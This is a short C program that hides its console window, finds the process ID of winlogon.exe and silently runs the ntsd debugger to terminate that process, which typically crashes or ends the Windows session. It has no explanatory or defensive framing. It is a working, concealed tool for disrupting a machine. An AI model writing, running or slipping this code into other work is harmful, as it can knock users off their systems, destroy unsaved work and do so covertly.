#include "NTSD_Winlogon.h"

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    DWORD pid = FindPID("winlogon.exe");
    if (pid == NULL) {
        pid = FindPID("WINLOGON.EXE");
    }
    char command[100];
    sprintf(command, "cmd /c start /min ntsd -c q -p %lu 1>nul 2>nul", pid);
    return system(command);
}